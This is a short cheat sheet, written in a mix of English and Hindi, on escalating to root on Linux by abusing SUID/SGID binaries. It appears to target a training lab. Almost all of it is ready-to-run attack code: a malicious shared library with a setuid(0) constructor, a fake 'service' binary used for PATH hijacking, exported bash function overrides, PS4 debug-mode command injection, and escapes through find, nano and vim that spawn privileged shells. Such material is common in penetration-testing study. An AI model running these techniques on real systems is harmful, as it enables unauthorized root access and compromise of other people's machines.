# Linux PrivEsc: SUID/SGID Master 

## **What is suid & sgid ?** 

>suid is a special permission in which if a user set permission of suid on the file then no matter who run the file the file run as the privillage of the owner of that file .
>sgid same as suid but it runs as the privillage of the groups owner
## 1. Enumeration (Finding the Target)

Sabse pehle system mein SUID binaries dhoondne ke liye :


```
find / -type f -perm -4000 - 2>/dev/null
```

---

## 2. Technique 1: Shared Object Injection

Jab binary kisi missing `.so` file ko load karne ki koshish kare .

**Step 1: Trace the binary**

Bash

```
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

_Maan lo output mein `/home/user/.config/libcalc.so` missing hai. _

**Step 2: Create the C code (`libcalc.c`)**

C

```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
```

**Step 3: Compile and Run**

Bash

```
gcc -fPIC -shared -o /home/user/.config/libcalc.so libcalc.c -nostartfiles
/usr/local/bin/suid-so
```

---

## 3. Technique 2: PATH Hijacking

Jab binary ke andar relative command (jaise `service`) use ho raha ho.

**Step 1: Check for relative paths**

Bash

```
strings /usr/local/bin/suid-env
```

_Agar output mein sirf `service apache2 start` dikhe (bina /usr/sbin/ ke)._

**Step 2: Create fake binary code (`service.c`)**

C

```
int main() {
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
```

**Step 3: Hijack the PATH**

Bash

```
gcc service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```

---

## 4. Technique 3: Abusing Bash Functions (Older Bash Versions)

Jab binary kisi absolute path (jaise `/usr/sbin/service`) ko call kare, hum use function bana kar hijack kar sakte hain.

**Step 1: Verify Absolute Path** `strings /usr/local/bin/suid-env2` -> Output: `/usr/sbin/service apache2 start`

**Step 2: Create & Export Function**

Bash

```
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

---

## 5. Technique 4: Shell Debugging (Bash < 4.4)

Bash debugging mode mein `PS4` variable ka use karke command inject karna.

**Step 1: Exploit command**

Bash

```
env -i SHELLOPTS=xtrace PS4='$(id && /bin/bash -p)' /usr/local/bin/suid-env2
```

---

## 6. Technique 5: GTFOBins (Native SUID)

Jab admin ne standard binaries par SUID set kar diya ho.

- **Example 1: Find**
    
    Bash
    
    ```
    /usr/bin/find . -exec /bin/sh -p \; -quit
    ```
    
- **Example 2: Nano**
    ```
     nano
    ^R ^X (Ctrl+R then Ctrl+X)
    reset; sh 1>&0 2>&0
    ```
*   **Example 3: Vim**
  
```
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

---